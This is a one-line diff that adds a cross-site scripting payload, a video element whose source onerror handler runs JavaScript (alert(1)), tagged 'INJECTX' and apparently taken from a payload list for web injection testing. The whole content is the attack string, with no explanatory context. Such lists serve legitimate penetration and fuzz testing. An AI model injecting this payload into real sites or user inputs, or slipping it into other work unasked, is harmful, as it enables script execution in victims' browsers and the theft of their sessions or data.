@@ -1,0 +1,1 @@
+<video><source onerror="javascript:alert(1)">//INJECTX
